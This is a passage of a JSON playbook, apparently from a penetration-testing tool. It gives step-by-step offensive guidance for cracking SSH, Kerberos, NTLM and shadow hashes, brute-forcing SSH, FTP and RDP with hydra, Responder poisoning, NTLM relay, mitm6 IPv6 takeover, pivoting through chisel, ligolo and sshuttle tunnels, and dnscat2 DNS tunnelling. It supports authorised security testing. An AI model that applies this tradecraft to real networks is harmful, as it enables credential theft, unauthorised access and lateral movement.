        "Chmod-ing on the target instead of your own copy."
      ]
    },
    {
      "when": "\"Permission denied (publickey)\" with \"no mutual signature algorithm\".",
      "land": [
        "OpenSSH 8.8+ disabled ssh-rsa by default. Re-enable it for this one connection with the PubkeyAcceptedKeyTypes and HostKeyAlgorithms flags."
      ],
      "look": [
        "The valid old-style key is now accepted."
      ],
      "win": "SSH negotiates the algorithm and the key is tried.",
      "mistakes": [
        "Assuming the key is wrong when it is an algorithm policy."
      ]
    },
    {
      "when": "\"Enter passphrase for key\": the key is encrypted.",
      "land": [
        "Crack the passphrase offline: ssh2john, then john with a wordlist. If you are not sure of the hash, drop it into the Workbench Hash ID."
      ],
      "look": [
        "john prints the passphrase."
      ],
      "win": "The cracked passphrase unlocks the key.",
      "mistakes": [
        "Brute-forcing SSH itself instead of cracking the passphrase offline."
      ]
    },
    {
      "when": "\"Load key: invalid format\".",
      "land": [
        "Usually CRLF from a Windows copy-paste, or a missing BEGIN/END line. dos2unix it and sanity-check with ssh-keygen -y."
      ],
      "look": [
        "ssh-keygen -y prints the public key, so the format is valid now."
      ],
      "win": "The key parses cleanly.",
      "mistakes": [
        "Dropping the -----BEGIN and -----END lines when you copied the key."
      ]
    },
    {
      "when": "THE PUZZLE: \"Permission denied (publickey)\" when the key SHOULD work.",
      "land": [
        "SSH StrictModes refuses a key whose target ~/.ssh or authorized_keys is too open or wrong-owned. You can only fix this from a foothold you already hold ON the target."
      ],
      "look": [
        "After tightening the TARGET ~/.ssh permissions, the key logs in."
      ],
      "win": "The login succeeds once the target-side permissions are correct.",
      "mistakes": [
        "Fixing your own Kali permissions again when the problem is the target side."
      ]
    },
    {
      "land": [
        "Retry with the matching fix applied. uid= means the key works now."
      ],
      "look": [
        "uid=... prints."
      ],
      "win": "id prints uid=..., so you have your foothold.",
      "mistakes": [
        "Not re-testing after each fix, so you cannot tell which one worked."
      ]
    }
  ],
  "linux-remote-exec": [
    {
      "when": "You hold a Linux credential (a password or a key) and SSH is reachable, and you want to run commands without a full session.",
      "land": [
        "PREFERRED, from Kali: nxc validates the credential over SSH and runs the command in one shot. Point target at a subnet to spray the check."
      ],
      "look": [
        "A [+] line with the command output means the credential works and the command ran."
      ],
      "win": "nxc returns the command output under a [+] success line.",
      "mistakes": [
        "Quoting trouble. Wrap the password and the command carefully."
      ]
    },
    {
      "when": "Password auth, one command at a time.",
      "land": [
        "sshpass runs one command and returns. String several with ; inside the quotes."
      ],
      "look": [
        "The command output returns over SSH."
      ],
      "win": "The one-shot command prints its output.",
      "mistakes": [
        "Leaving StrictHostKeyChecking on for a first connect, which will prompt."
      ]
    },
    {
      "when": "Key auth.",
      "land": [
        "Save the recovered key to id_rsa first, then run the command."
      ],
      "look": [
        "The command output returns using the key."
      ],
      "win": "The key-authenticated command prints its output.",
      "mistakes": [
        "Forgetting chmod 600 on the key."
      ]
    }
  ],
  "crack-identify": [
    {
      "when": "The first step with any hash you cannot name. Get the exact hashcat -m and john format before you waste a run.",
      "land": [
        "name-that-hash ranks the likely types. Or paste the hash into the Workbench Hash ID tab for the same answer plus a ready crack command."
      ],
      "look": [
        "The ranked candidates. In an AD context a 32-hex is almost always NTLM, not MD5."
      ],
      "win": "You have the hashcat mode and john format to use next.",
      "mistakes": [
        "Guessing the mode and hitting \"token length exception\" or \"no hashes loaded\"."
      ]
    },
    {
      "when": "When you prefer hashid.",
      "land": [
        "hashid -m prints the hashcat mode for each guess."
      ],
      "look": [
        "The -m number to pass to hashcat."
      ],
      "win": "hashid prints a mode you can use.",
      "mistakes": [
        "Trusting the top guess blindly. Length and context decide."
      ]
    }
  ],
  "crack-hash-troubleshoot": [
    {
      "when": "\"Token length exception\" almost always means the wrong -m.",
      "land": [
        "Re-identify the hash (Workbench Hash ID, or hashid -m) and use the exact mode."
      ],
      "look": [
        "The correct mode loads the hash without the exception."
      ],
      "win": "hashcat accepts the hash once the mode matches.",
      "mistakes": [
        "Keeping a wrong mode and blaming the hash."
      ]
    },
    {
      "when": "\"No hashes loaded\" on a hashcat run.",
      "land": [
        "Match the user prefix to the mode: NetNTLMv2 and Kerberos modes WANT user$realm in the line, raw MD5 and NTLM modes do NOT. Strip or keep the user: prefix to match."
      ],
      "look": [
        "The hash loads once the line format matches the mode."
      ],
      "win": "hashcat starts cracking instead of reporting no hashes.",
      "mistakes": [
        "Leaving a user: prefix on a raw-hash mode, or stripping it from a NetNTLM line."
      ]
    },
    {
      "when": "The john equivalent.",
      "land": [
        "Pick the matching --format (john --list=formats | grep your type). \"No password hashes loaded\" means the format is wrong or the file is malformed."
      ],
      "look": [
        "john starts a session with the right format."
      ],
      "win": "john loads the hash and begins.",
      "mistakes": [
        "Wrong --format, or CRLF line endings in the hash file."
      ]
    },
    {
      "when": "A GPU or OpenCL error in a VM: \"No devices found/left\".",
      "land": [
        "--force runs anyway and -D 1 uses the CPU. Slower, but it works in a VM with no usable GPU."
      ],
      "look": [
        "hashcat runs on the CPU instead of erroring out."
      ],
      "win": "The crack proceeds on CPU.",
      "mistakes": [
        "Expecting GPU speed on a CPU fallback. Use a focused wordlist."
      ]
    }
  ],
  "crack-kerberoast": [
    {
      "when": "You have a $krb5tgs$ hash from Kerberoasting a service account.",
      "land": [
        "hashcat -m 13100 with rockyou. Service accounts often have weak passwords, so this is high value. The Workbench Hash ID confirms the mode and hands a ready command."
      ],
      "look": [
        "hashcat prints the hash:password line (Cracked)."
      ],
      "win": "The service account password appears.",
      "mistakes": [
        "Wrong mode. 13100 is RC4, AES variants are 19600 and 19700.",
        "hashcat exits with `CL_PLATFORM_NOT_FOUND` on a VM with no GPU. Fix: `sudo apt install -y pocl-opencl-icd` (the Loadout arsenal now does this), or crack with john, no GPU needed."
      ]
    },
    {
      "when": "With john.",
      "land": [
        "john --format=krb5tgs with a wordlist."
      ],
      "look": [
        "john shows the cracked password."
      ],
      "win": "john recovers the password.",
      "mistakes": [
        "Wrong --format."
      ]
    },
    {
      "when": "When the Kerberoast ticket starts with $krb5tgs$18$ (AES-256).",
      "land": [
        "hashcat -m 19700 with rockyou. Modern AD accounts with AES encryption enabled produce etype 18 tickets instead of RC4 (etype 23)."
      ],
      "look": [
        "hashcat prints the hash:password line (Cracked)."
      ],
      "win": "The AES-256 service account password appears.",
      "mistakes": [
        "Running -m 13100 against an etype 18 ($krb5tgs$18$) ticket, which causes a Token length / Separator unmatched error."
      ]
    },
    {
      "when": "When the Kerberoast ticket starts with $krb5tgs$17$ (AES-128).",
      "land": [
        "hashcat -m 19600 with rockyou for etype 17 tickets."
      ],
      "look": [
        "hashcat prints the hash:password line (Cracked)."
      ],
      "win": "The AES-128 service account password appears.",
      "mistakes": [
        "Using -m 13100 or -m 19700 on an etype 17 ($krb5tgs$17$) ticket."
      ]
    }
  ],
  "crack-asrep-offline": [
    {
      "when": "You have a $krb5asrep$ hash (an account with \"do not require pre-auth\").",
      "land": [
        "hashcat -m 18200 with rockyou. It is RC4, so it is fast."
      ],
      "look": [
        "The cracked password line."
      ],
      "win": "The account password appears.",
      "mistakes": [
        "Wrong mode."
      ]
    },
    {
      "when": "With john.",
      "land": [
        "john --format=krb5asrep with a wordlist."
      ],
      "look": [
        "john shows the cracked password."
      ],
      "win": "john recovers the password.",
      "mistakes": [
        "Wrong --format."
      ]
    }
  ],
  "crack-ntlm": [
    {
      "when": "When you need the cleartext behind an NTLM hash (usually for password reuse elsewhere).",
      "land": [
        "hashcat -m 1000 with rockyou. Remember you can often pass-the-hash directly without cracking. Cracking only matters when you need the plaintext."
      ],
      "look": [
        "The hash:password line."
      ],
      "win": "The cleartext password appears.",
      "mistakes": [
        "Spending time cracking when pass-the-hash would have worked."
      ]
    },
    {
      "when": "Legacy LM hash mode when the SAM line has a non-empty first half.",
      "land": [
        "hashcat -m 3000 with rockyou and -O. LM hashes split passwords into two 7-character halves and uppercase them, making them trivial to crack."
      ],
      "look": [
        "The cracked 7-character password halves in hashcat output."
      ],
      "win": "Both LM halves crack and reveal the cleartext password.",
      "mistakes": [
        "Trying to crack empty LM hashes (aad3b435b51404eeaad3b435b51404ee) which represent disabled or blank LM."
      ]
    }
  ],
  "crack-netntlmv2": [
    {
      "when": "You captured a NetNTLMv2 hash (Responder or an SMB relay).",
      "land": [
        "hashcat -m 5600 with rockyou. Consider relaying it live instead if the account can reach something useful."
      ],
      "look": [
        "The cracked password line."
      ],
      "win": "The user password appears.",
      "mistakes": [
        "Trimming the hash line, which breaks mode 5600. It wants the full user$realm form."
      ]
    },
    {
      "when": "When Responder or a downgrade captures a NetNTLMv1 challenge and response.",
      "land": [
        "hashcat -m 5500 with rockyou and -O. NetNTLMv1 uses a 24-byte response format that cracks significantly faster than v2."
      ],
      "look": [
        "The cracked NetNTLMv1 password line."
      ],
      "win": "The NetNTLMv1 password appears.",
      "mistakes": [
        "Using mode 5600 on a NetNTLMv1 challenge or mode 5500 on NetNTLMv2."
      ]
    }
  ],
  "crack-shadow": [
    {
      "when": "You read /etc/shadow (a $6$ sha512crypt line).",
      "land": [
        "hashcat -m 1800 with rockyou. Slow and salted, so use a good list and be patient."
      ],
      "look": [
        "The cracked password line."
      ],
      "win": "A shadow password cracks.",
      "mistakes": [
        "Expecting it to be fast. sha512crypt is slow by design."
      ]
    },
    {
      "when": "When you have both /etc/passwd and /etc/shadow.",
      "land": [
        "unshadow merges them, then john cracks the combined file."
      ],
      "look": [
        "john shows cracked user:password pairs."
      ],
      "win": "john recovers one or more passwords.",
      "mistakes": [
        "Forgetting to unshadow first."
      ]
    }
  ],
  "crack-archive": [
    {
      "when": "A password-protected .zip from loot.",
      "land": [
        "zip2john extracts the hash. Crack it with john (the last command here)."
      ],
      "look": [
        "archive.hash is written."
      ],
      "win": "A crackable hash file is produced.",
      "mistakes": [
        "Pointing it at the wrong archive."
      ]
    },
    {
      "when": "A .rar.",
      "land": [
        "rar2john extracts the hash."
      ],
      "look": [
        "The hash file is written."
      ],
      "win": "archive.hash is produced.",
      "mistakes": [
        "Using the wrong *2john tool for the format."
      ]
    },
    {
      "when": "A .7z (needs the john-jumbo build).",
      "land": [
        "7z2john extracts the hash."
      ],
      "look": [
        "The hash file is written."
      ],
      "win": "archive.hash is produced.",
      "mistakes": [
        "Using a stock john without the jumbo patches."
      ]
    },
    {
      "when": "Crack the extracted archive hash.",
      "land": [
        "john auto-detects the *2john format. Unzip with the cracked password, then paste any creds or configs from inside into Evidence."
      ],
      "look": [
        "john shows the archive password."
      ],
      "win": "The archive opens with the cracked password.",
      "mistakes": [
        "Stopping at the password instead of looting the contents."
      ]
    }
  ],
  "online-brute-ssh": [
    {
      "when": "A spray against an ENUMERATED user list, when offline cracking is not an option. This move only appears once you actually have a user list. Mind the lockout policy.",
      "land": [
        "It fills from your enumerated user list ({{userlist}}). -t 4 keeps SSH stable, -f stops on the first hit. Pick the password list in the Workbench Wordlist picker."
      ],
      "look": [
        "A green [22][ssh] host login: line on a hit."
      ],
      "win": "hydra prints a valid user and password.",
      "mistakes": [
        "Hammering with a huge list and locking accounts. Prefer a small, targeted list."
      ]
    }
  ],
  "blind-brute-ssh": [
    {
      "when": "The true last resort: SSH is open, you have NO enumerated user list, and nothing else is panning out. It sits at the bottom of the list on purpose.",
      "land": [
        "This uses a SHORT common-users wordlist (root, admin, service names), not an enumerated one, so it works precisely when you have no user list. If a login lands, stop and pivot."
      ],
      "look": [
        "A green [22][ssh] host login: line on a hit, usually a default or reused account."
      ],
      "win": "hydra returns a common-account login.",
      "mistakes": [
        "Grinding rockyou blindly and locking every common account. Keep the user list short, watch the lockout policy, and treat this as a background throw, not a plan."
      ]
    }
  ],
  "online-brute-ftp": [
    {
      "when": "An FTP login brute, with a user list and lockout awareness.",
      "land": [
        "Seed users.txt from enumeration. Watch the lockout policy."
      ],
      "look": [
        "A [21][ftp] host login: line on a hit."
      ],
      "win": "hydra prints valid FTP credentials.",
      "mistakes": [
        "Ignoring lockout and burning accounts."
      ]
    }
  ],
  "online-brute-rdp": [
    {
      "when": "An RDP brute, the highest lockout risk of the three.",
      "land": [
        "-t 1 (single thread) is important for RDP. Prefer a small, targeted list."
      ],
      "look": [
        "A [3389][rdp] host login: line on a hit."
      ],
      "win": "hydra prints valid RDP credentials.",
      "mistakes": [
        "Multi-threading RDP (unstable), or using a huge list (lockout)."
      ]
    }
  ],
  "crack-mscache2": [
    {
      "when": "A $DCC2$ cached domain hash from a workstation.",
      "land": [
        "hashcat -m 2100 with rockyou. Very slow (high iteration), so use a focused list and keep expectations low."
      ],
      "look": [
        "The cracked password line, if your list has it."
      ],
      "win": "A cached credential cracks.",
      "mistakes": [
        "Expecting speed. DCC2 is deliberately slow, so a big list will not finish."
      ]
    },
    {
      "when": "CPU-only VM or when John is preferred for DCC2 ($DCC2$10240#user#hash).",
      "land": [
        "john --format=mscash2 with rockyou or a targeted custom wordlist."
      ],
      "look": [
        "John prints the cracked password alongside the cached domain username."
      ],
      "win": "A cached domain credential cracks on CPU.",
      "mistakes": [
        "Using --format=mscash (MSCASHv1) instead of --format=mscash2 for modern $DCC2$ hashes."
      ]
    }
  ],
  "responder-poison": [
    {
      "when": "Early on a Windows broadcast network, to see what name lookups are flying around before you poison anything.",
      "land": [
        "Analyse mode (-A) only observes. Watch which LLMNR, NBT-NS and mDNS names are queried so you know poisoning will land before you risk it."
      ],
      "look": [
        "Queried names scrolling by. Frequent mistyped paths mean a victim is likely."
      ],
      "win": "You see the broadcasts and can judge whether poisoning is worth it.",
      "mistakes": [
        "Skipping analyse mode and poisoning blind in a quiet or monitored network."
      ]
    },
    {
      "when": "When analyse mode showed traffic worth catching.",
      "land": [
        "Poison and capture (-wv). Leave it running. Captured NetNTLMv2 hashes land in the console and in the logs."
      ],
      "look": [
        "An \"[SMB] NTLMv2-SSP Hash\" block for a user. That is your loot."
      ],
      "win": "A NetNTLMv2 hash for a real user is captured.",
      "mistakes": [
        "Stopping too soon. Captures come when a user acts, so give it time."
      ]
    },
    {
      "when": "Once you have a captured NetNTLMv2 hash.",
      "land": [
        "Crack it offline with hashcat -m 5600. The Workbench Hash ID confirms the mode and hands the command."
      ],
      "look": [
        "The cracked password line."
      ],
      "win": "The captured hash cracks to a usable password.",
      "mistakes": [
        "Trimming the hash. Mode 5600 needs the full line."
      ]
    }
  ],
  "ntlm-relay-attack": [
    {
      "when": "When SMB signing is NOT required on some hosts (see the NTLM Relay finding). Relay the auth instead of cracking it.",
      "land": [
        "Point ntlmrelayx at a list of signing-disabled hosts. It dumps SAM by default. relay-targets.txt is the hosts from the signing check."
      ],
      "look": [
        "A relayed session and a dumped SAM for a target host."
      ],
      "win": "ntlmrelayx relays auth and dumps hashes with no cracking at all.",
      "mistakes": [
        "Relaying to a host that DOES require signing, which just fails."
      ]
    },
    {
      "when": "When you want an interactive SMB client on one relayed host.",
      "land": [
        "Relay to a single host with -i to open an interactive SMB client on success."
      ],
      "look": [
        "An smb> prompt on the relayed host."
      ],
      "win": "You get an interactive SMB session via the relay.",
      "mistakes": [
        "Expecting a shell. This is an SMB client, so use it to read shares or run via services."
      ]
    },
    {
      "when": "Set up Responder to feed the relay.",
      "land": [
        "Turn Responder own SMB and HTTP servers OFF (in Responder.conf) so the auth is RELAYED by ntlmrelayx instead of captured by Responder."
      ],
      "look": [
        "Responder poisons but hands the auth to ntlmrelayx."
      ],
      "win": "The two tools work together: Responder poisons, ntlmrelayx relays.",
      "mistakes": [
        "Leaving Responder SMB and HTTP on, which captures the auth instead of relaying it."
      ]
    }
  ],
  "mitm6-ipv6-takeover": [
    {
      "when": "A modern AD network where Windows asks for a DHCPv6 lease it usually does not get.",
      "land": [
        "Become the rogue DHCPv6 and DNS server on your attacker interface. Run it alongside ntlmrelayx, which catches the relayed auth."
      ],
      "look": [
        "mitm6 handing out leases and becoming the victim DNS."
      ],
      "win": "Victims start using you as their DNS.",
      "mistakes": [
        "Running mitm6 without ntlmrelayx ready to catch the relayed auth."
      ]
    },
    {
      "when": "Catch the mitm6-driven auth and relay it to the DC over LDAPS.",
      "land": [
        "Relay to ldaps://DC with -wh serving a fake WPAD. Loot lands in the loot dir. Depending on the domain this can create a computer or grant privileges."
      ],
      "look": [
        "Relayed LDAPS auth and loot written to ./loot."
      ],
      "win": "The relay lands against the DC and loot is written.",
      "mistakes": [
        "Wrong DC in -t, or forgetting -6 for IPv6."
      ]
    }
  ],
  "pivot-chisel-socks": [
    {
      "when": "On Kali first: stand up the chisel server before the agent dials in.",
      "land": [
        "chisel server -p 8080 --reverse waits for the agent. Leave it running."
      ],
      "look": [
        "\"server listening\", then, when the agent connects, a tunnel is established."
      ],
      "win": "The server reports the reverse tunnel is up.",
      "mistakes": [
        "Starting the agent before the server."
      ]
    },
    {
      "when": "On the foothold: dial back to your chisel server and open a reverse SOCKS proxy.",
      "land": [
        "chisel client to your LHOST:8080 with R:socks. Then point proxychains at 127.0.0.1:1080."
      ],
      "look": [
        "The client connects and a SOCKS proxy opens on your Kali 1080."
      ],
      "win": "proxychains can now reach the internal network through the tunnel.",
      "mistakes": [
        "Not matching the SOCKS port in proxychains.conf."
      ]
    },
    {
      "when": "On the foothold: expose a single loopback-only service (127.0.0.1:3306, 8000, 8080) directly on Kali without proxychains.",
      "land": [
        "Run chisel client with R:<port>:127.0.0.1:<port> against your running chisel server --reverse."
      ],
      "look": [
        "Connected message on the foothold and 127.0.0.1:<port> listening locally on Kali."
      ],
      "win": "Your Kali tools can talk directly to 127.0.0.1:<port> as if the target loopback service were local.",
      "mistakes": [
        "Binding a local Kali port that is already in use by a local service such as local MySQL or Burp."
      ]
    }
  ],
  "pivot-ligolo": [
    {
      "when": "On Kali: start the ligolo proxy and bring up the tun interface.",
      "land": [
        "ligolo-proxy -selfcert. In the ligolo prompt, start the interface and add the route to the internal CIDR."
      ],
      "look": [
        "The ligolo console. After session and the route, internal traffic flows through the agent."
      ],
      "win": "The ligolo interface is up and routing to the internal subnet.",
      "mistakes": [
        "Forgetting to add the route for the internal CIDR."
      ]
    },
    {
      "when": "On the foothold: run the agent back to your proxy.",
      "land": [
        "agent -connect LHOST:11601 -ignore-cert. It appears as a session in the proxy."
      ],
      "look": [
        "\"Agent joined\" in the proxy console."
      ],
      "win": "The agent registers and you can route through it.",
      "mistakes": [
        "A firewall blocking 11601 outbound. Pick a port egress allows."
      ]
    }
  ],
  "pivot-sshuttle": [
    {
      "when": "When you have SSH creds on the pivot host and want a transparent route, no proxychains.",
      "land": [
        "sshuttle -r user@pivot internal_cidr routes that subnet over SSH, transparently."
      ],
      "look": [
        "sshuttle reports \"Connected\". Internal IPs now respond from Kali directly."
      ],
      "win": "You reach the internal CIDR with normal tools, no proxychains.",
      "mistakes": [
        "Wrong CIDR, or no python on the pivot (sshuttle needs it there)."
      ]
    }
  ],
  "pivot-ssh-dynamic": [
    {
      "when": "A quick SOCKS proxy over an SSH session you can already open.",
      "land": [
        "ssh -D 1080 -N opens a SOCKS proxy on 1080. Point proxychains at it."
      ],
      "look": [
        "The SSH session holds open and proxychains traffic flows through it."
      ],
      "win": "proxychains reaches internal hosts via 127.0.0.1:1080.",
      "mistakes": [
        "Dropping the session. -N keeps it open with no shell."
      ]
    }
  ],
  "pivot-scan-through": [
    {
      "when": "Scanning an internal host through a SOCKS tunnel.",
      "land": [
        "proxychains with a TCP connect scan (-sT -Pn -n). SYN scans do NOT work through proxychains."
      ],
      "look": [
        "Open internal ports, slowly. Keep the port set small through a tunnel."
      ],
      "win": "You enumerate an internal host you could not reach directly.",
      "mistakes": [
        "Using -sS (SYN) through proxychains, which fails. Use -sT."
      ]
    },
    {
      "when": "When you have a transparent route (sshuttle or ligolo), not a SOCKS proxy.",
      "land": [
        "Run nmap -sV -Pn directly. The route handles reachability."
      ],
      "look": [
        "Normal nmap output for the internal host."
      ],
      "win": "Service and version detail on the internal target.",
      "mistakes": [
        "Expecting ping to work. -Pn skips host discovery on internal hosts."
      ]
    }
  ],
  "dns-tunnel": [
    {
      "when": "First confirm direct egress is actually blocked before reaching for a DNS tunnel.",
      "land": [
        "curl your LHOST with a short timeout. \"blocked\" means no direct outbound, so DNS tunneling may be the way out."
      ],
      "look": [
        "A timeout or blocked result confirms the egress restriction."
      ],
      "win": "You confirm direct egress is blocked, so a DNS tunnel is justified.",
      "mistakes": [
        "Building a slow DNS tunnel when a simpler port (443, or TCP 53) would have worked."
      ]
    },
    {
      "when": "On Kali: run the dnscat2 server for your domain.",
      "land": [
        "dnscat2-server for the delegated domain. It waits for the client."
      ],
      "look": [
        "The server listening for dnscat sessions."
      ],
      "win": "The server is up for the tunnel.",
      "mistakes": [
        "No DNS delegation to your server, so the tunnel cannot form."
      ]
    },
    {
      "when": "On the foothold: run the dnscat client to your domain.",
      "land": [
        "./dnscat domain dials home over DNS."
      ],
      "look": [
        "A new session appears on the server."
      ],
      "win": "A dnscat session establishes over DNS.",
      "mistakes": [
        "A blocked internal resolver. The tunnel rides the box own DNS."
      ]
    },
    {
      "when": "Interact with the session on the server.",
      "land": [
        "window -i 1 drops into the session to run commands."
      ],
      "look": [
        "A command window for the tunneled host."
      ],
      "win": "You can run commands over the DNS tunnel.",
      "mistakes": [
        "Expecting speed. DNS tunnels are slow, so use them only when nothing else leaves."
      ]
    }
  ],
  "pivot-ssh-portforward": [
    {
      "when": "Local forward (-L): reach ONE internal service through the pivot.",
      "land": [
        "ssh -L localport:internal_host:port forwards a single internal service to your Kali localport."
      ],
      "look": [
        "The forwarded port answers on 127.0.0.1 locally."
      ],
      "win": "You hit the internal service at 127.0.0.1:localport.",
      "mistakes": [
        "Confusing -L (bring a service TO you) with -R (push one OUT)."
      ]
    },
    {
      "when": "Remote forward (-R): expose YOUR Kali service to the target side.",
      "land": [
        "ssh -R opens a port on the target that forwards back to your Kali."
      ],
      "look": [
        "The target can now reach your service on its own localhost."
      ],
      "win": "The target reaches your Kali-side service via the remote forward.",
      "mistakes": [
        "GatewayPorts off on the server, so only the target localhost can use it."
      ]
    }
  ],
  "pivot-enumerate-neighbors": [
    {
      "when": "From the pivot: sweep the adjacent hosts you just learned about.",
      "land": [
        "nxc smb across the neighbor list is a fast first look (signing, OS, names)."
      ],
      "look": [
        "Live hosts, OS, and whether signing is required (relay candidates)."
      ],
      "win": "You map which neighbors are alive and interesting.",
      "mistakes": [
        "Scanning the whole subnet when ARP already named the live ones."
      ]
    },
    {
      "when": "Direct scan when you have a transparent route.",
      "land": [
        "nmap -sV -Pn against the neighbors."
      ],
      "look": [
        "Services on the neighboring hosts."
      ],
      "win": "Service detail across the neighbors.",
      "mistakes": [
        "Forgetting -Pn on internal hosts that drop ping."
      ]
    },
    {
      "when": "Through a SOCKS proxy.",
      "land": [
        "proxychains nmap -sT -Pn -n across the neighbors."
      ],
      "look": [
        "Open ports on the neighbors, slowly."
      ],
      "win": "Internal neighbors enumerated through the tunnel.",
      "mistakes": [
        "-sS through proxychains, which fails. Use -sT."
      ]
    }
  ],
  "pivot-reach-listener": [
    {
      "when": "An internal-only service bound to 127.0.0.1 on the pivot.",
      "land": [
        "ssh -L localport:127.0.0.1:listenerport brings that loopback-only service to your Kali."
      ],
      "look": [
        "The service answers on your 127.0.0.1:localport."
      ],
      "win": "You reach a service the box only exposed on localhost.",
      "mistakes": [
        "Targeting the host IP instead of 127.0.0.1 in the forward. Loopback-only services refuse the external IP."
      ]
    },
    {
      "when": "Confirm what the forwarded service is.",
      "land": [
        "nmap -sV against 127.0.0.1:localport fingerprints it."
      ],
      "look": [
        "The service and version now that it is reachable."
      ],
      "win": "You identify the internal-only service.",
      "mistakes": [
        "Not fingerprinting it before choosing an attack."
      ]
    }
  ],
  "pivot-internal-dns": [
    {
      "when": "When you can query the internal resolver and want to find the DC.",
      "land": [
        "dig for the _ldap._tcp.dc._msdcs SRV record points you at the domain controllers."
      ],
      "look": [
        "SRV records naming the DC hostnames."
      ],
      "win": "The DC or DCs are named.",
      "mistakes": [
        "Querying a public resolver instead of the internal one."
      ]
    },
    {
      "when": "Try a zone transfer against the internal resolver.",
      "land": [
        "dig AXFR. If it is allowed, you get the whole internal map."
      ],
      "look": [
        "A full zone dump (every internal host) on success."
      ],
      "win": "A successful AXFR hands you the internal namespace.",
      "mistakes": [
        "Assuming AXFR is open. It usually is not, but it is cheap to try."
      ]
    },
    {
      "when": "The nslookup equivalent on Windows.",
      "land": [
        "nslookup -type=SRV for the same DC record."
      ],
      "look": [
        "The SRV records for the DC."
      ],
      "win": "The DC is identified from a Windows host.",
      "mistakes": [
        "Not specifying the internal DNS server to query."
      ]
    }
  ],
  "local-linux-interfaces": [
    {
      "when": "Right after a Linux foothold, to see if this box bridges to another network.",
      "land": [
        "Lists the interfaces remotely over SSH. A second NIC on a different subnet is a pivot target."
      ],
      "look": [
        "A second IP on an internal range (10.x, 172.16-31.x, 192.168.x) you could not reach from Kali."
      ],
      "win": "A second subnet appears, which is your pivot direction.",
      "mistakes": [
        "Ignoring a second NIC because the first one is the way you came in."
      ]
    },
    {
      "when": "Inside an interactive Linux shell on the foothold host.",
      "land": [
        "Runs ip -br addr and ip addr directly on the target to list all NICs and IPv4/IPv6 addresses."
      ],
      "look": [
        "Any non-loopback interface on an internal subnet (10.x, 172.16-31.x, 192.168.x) or container bridge."
      ],
      "win": "All interface addresses print and Obol registers any newly discovered internal subnet.",
      "mistakes": [
        "Overlooking docker0, lxcbr0, or tun interfaces that bridge to internal containers or VPNs."
      ]
    },
    {
      "when": "On minimal containers or legacy Linux hosts where iproute2 (ip) is not installed.",
      "land": [
        "Falls back to ifconfig -a or /proc/net/fib_trie to enumerate local interface addresses."
      ],
      "look": [
        "LOCAL host entries in /proc/net/fib_trie or inet lines in ifconfig output."
      ],
      "win": "Interface IP addresses are recovered even without the ip binary.",
      "mistakes": [
        "Giving up when ip: command not found appears in a stripped container."
      ]
    }
  ],
  "local-linux-routes": [
    {
      "when": "To see which networks this box can reach.",
      "land": [
        "Prints the routing table remotely. Routes to internal CIDRs are networks you can pivot into."
      ],
      "look": [
        "Routes to subnets Kali cannot reach directly."
      ],
      "win": "An internal route you can tunnel toward.",
      "mistakes": [
        "Overlooking specific internal routes behind the default route."
      ]
    },
    {
      "when": "Inside an interactive Linux shell on the foothold host.",
      "land": [
        "Displays both the IPv4 and IPv6 kernel routing tables using ip route."
      ],
      "look": [
        "Static or connected routes pointing to internal subnets via a secondary interface."
      ],
      "win": "The full routing table prints and reveals reachable internal networks.",
      "mistakes": [
        "Checking only IPv4 when an internal management network is routed over IPv6."
      ]
    },
    {
      "when": "On legacy Linux systems or minimal containers without iproute2.",
      "land": [
        "Uses netstat -rn or route -n to print numeric kernel routing tables."
      ],
      "look": [
        "Destination subnets and Gateway addresses outside your primary ingress network."
      ],
      "win": "Numeric routing entries print without DNS lookup delays.",
      "mistakes": [
        "Omitting -n and waiting on reverse DNS timeouts."
      ]
    }
  ],
  "local-linux-neighbors": [
    {
      "when": "To find live hosts near this box without scanning.",
      "land": [
        "The ARP/neighbor table lists machines this box recently talked to. Each one is alive."
      ],
      "look": [
        "IPs in the ARP table, especially on a second subnet."
      ],
      "win": "A short list of confirmed-live neighbors to target through the pivot.",
      "mistakes": [
        "Scanning the whole subnet when ARP already named the live ones."
      ]
    },
    {
      "when": "Inside an interactive Linux shell on the foothold host.",
      "land": [
        "Queries both ip neigh and arp -a on the host to list recently contacted neighbors."
      ],
      "look": [
        "REACHABLE or STALE neighbor IPs on internal interfaces."
      ],
      "win": "Live internal host IPs appear immediately with zero active scanning noise.",
      "mistakes": [
        "Ignoring STALE entries; STALE still means the host was recently active at that IP."
      ]
    }
  ],
  "local-linux-dns": [
    {
      "when": "To find the internal resolver, which is often the DC.",
      "land": [
        "Reads /etc/resolv.conf remotely. The nameserver is often a domain controller."
      ],
      "look": [
        "An internal DNS server IP, a likely DC and a pivot or enum target."
      ],
      "win": "The internal resolver IP, your route to AD DNS enumeration.",
      "mistakes": [
        "Assuming it is a public resolver. Internal boxes point at the DC."
      ]
    },
    {
      "when": "Inside an interactive Linux shell on the foothold host.",
      "land": [
        "Reads both /etc/resolv.conf and /etc/hosts to capture internal nameservers, search domains, and hardcoded hostnames."
      ],
      "look": [
        "nameserver lines, domain/search suffixes, and custom internal host mappings in /etc/hosts."
      ],
      "win": "Internal DNS servers and static host mappings print in one shot.",
      "mistakes": [
        "Checking only /etc/resolv.conf and missing hardcoded internal hosts in /etc/hosts."
      ]
    }
  ],
  "local-windows-interfaces": [
    {
      "when": "After a Windows foothold, to check for a second network.",
      "land": [
        "ipconfig /all over WinRM. A second adapter on an internal subnet is a pivot target."
      ],
      "look": [
        "A second IPv4 on an internal range you cannot reach from Kali."
      ],
      "win": "A second subnet to pivot into.",
      "mistakes": [
        "Missing a disconnected-looking adapter that is actually internal."
      ]
    },
    {
      "when": "Inside an interactive Windows shell (cmd.exe or PowerShell) on the target host.",
      "land": [
        "Runs ipconfig /all locally to list every network adapter, IPv4/IPv6 address, DNS suffix, and default gateway."
      ],
      "look": [
        "Secondary Ethernet or vEthernet adapters bound to internal subnets."
      ],
      "win": "Full adapter configuration prints and Obol extracts any internal subnet.",
      "mistakes": [
        "Running bare ipconfig and missing DNS suffixes and DHCP/DC server IPs shown by /all."
      ]
    },
    {
      "when": "Inside a Windows shell when you want a clean PowerShell summary of adapters and gateways.",
      "land": [
        "Runs Get-NetIPConfiguration to display structured adapter, IP, gateway, and DNS server objects."
      ],
      "look": [
        "IPv4Address, IPv4DefaultGateway, and DNSServer fields on each interface."
      ],
      "win": "Structured per-interface IP and gateway summary prints.",
      "mistakes": [
        "Forgetting -ep bypass when invoking powershell from cmd.exe."
      ]
    }
  ],
  "local-windows-routes": [
    {
      "when": "To see reachable networks from a Windows box.",
      "land": [
        "route print remotely. Internal routes are pivot directions."
      ],
      "look": [
